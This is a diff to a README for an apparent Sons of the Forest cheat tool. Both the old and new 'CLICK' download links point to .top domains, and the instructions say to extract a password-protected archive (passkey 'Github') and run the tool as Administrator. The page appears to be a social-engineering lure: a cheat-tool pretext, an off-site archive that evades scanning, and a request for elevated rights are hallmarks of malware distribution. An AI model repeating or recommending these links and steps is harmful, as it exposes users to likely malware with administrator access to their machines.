@@ -6,7 +6,7 @@ Sons of the Forest unlocker with item spawner, blueprint unlocker, achievement u
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular mods like **SotF Modding** and **BepInEx**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Sons of the Forest.
 4. Run the tool **as Administrator**.
